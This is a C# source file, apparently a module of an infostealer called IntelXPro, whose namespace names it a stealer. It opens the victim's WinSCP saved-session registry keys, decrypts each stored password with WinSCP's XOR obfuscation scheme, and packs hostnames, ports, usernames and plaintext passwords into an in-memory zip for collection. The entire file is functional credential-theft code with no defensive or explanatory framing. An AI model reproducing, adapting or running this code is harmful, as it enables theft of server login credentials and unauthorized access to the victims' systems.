using IntelXPro.src.IntelXPro.Dependencies.Data;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class WinSCP : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            List<string> list = new List<string>();
            List<string> list2 = new List<string>();
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Martin Prikryl\\WinSCP 2\\Sessions"))
                {
                    if (registryKey == null)
                    {
                        return;
                    }
                    string[] subKeyNames = registryKey.GetSubKeyNames();
                    foreach (string text in subKeyNames)
                    {
                        string text2 = "Software\\Martin Prikryl\\WinSCP 2\\Sessions\\" + text;
                        using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(text2))
                        {
                            if (registryKey2 != null)
                            {
                                string text3 = registryKey2.GetValue("HostName")?.ToString();
                                if (!string.IsNullOrWhiteSpace(text3))
                                {
                                    string text4 = registryKey2.GetValue("UserName")?.ToString();
                                    string pass = registryKey2.GetValue("Password")?.ToString();
                                    string text5 = DecryptPassword(text4, pass, text3);
                                    string text6 = registryKey2.GetValue("PortNumber")?.ToString();
                                    list.Add("Session: " + text + "\nUrl: " + text3 + ":" + text6 + "\nUsername: " + text4 + "\nPassword: " + text5);
                                    list2.Add("HKEY_CURRENT_USER\\" + text2);
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
            }
            if (list.Count <= 0)
            {
                return;
            }
            string text7 = "WinScp\\Sessions.txt";
            zip.AddTextFile(text7, string.Join("\n\n", list));
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "WinSCP";
            foreach (string item in list2)
            {
                counterApplications.Files.Add(item + " => " + text7);
            }
            counterApplications.Files.Add(text7);
            counter.Applications.Add(counterApplications);
        }

        private static int DecryptNextChar(List<string> charList)
        {
            return 0xFF ^ ((((int.Parse(charList[0]) << 4) + int.Parse(charList[1])) ^ 0xA3) & 0xFF);
        }

        private static string DecryptPassword(string user, string pass, string host)
        {
            if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass) || string.IsNullOrEmpty(host))
            {
                return "";
            }
            try
            {
                List<string> list = pass.Select((char c) => c.ToString()).ToList();
                List<string> list2 = new List<string>();
                foreach (string item in list)
                {
                    switch (item)
                    {
                        case "A":
                            list2.Add("10");
                            break;
                        case "B":
                            list2.Add("11");
                            break;
                        case "C":
                            list2.Add("12");
                            break;
                        case "D":
                            list2.Add("13");
                            break;
                        case "E":
                            list2.Add("14");
                            break;
                        case "F":
                            list2.Add("15");
                            break;
                        default:
                            list2.Add(item);
                            break;
                    }
                }
                if (DecryptNextChar(list2) == 255)
                {
                    DecryptNextChar(list2);
                }
                list2.RemoveRange(0, 4);
                int num = DecryptNextChar(list2);
                list2.RemoveRange(0, 2);
                int count = DecryptNextChar(list2) * 2;
                list2.RemoveRange(0, count);
                string text = "";
                for (int num2 = 0; num2 < num; num2++)
                {
                    text += (char)DecryptNextChar(list2);
                    list2.RemoveRange(0, 2);
                }
                string oldValue = user + host;
                return text.Replace(oldValue, "");
            }
            catch
            {
                return "";
            }
        }
    }
}
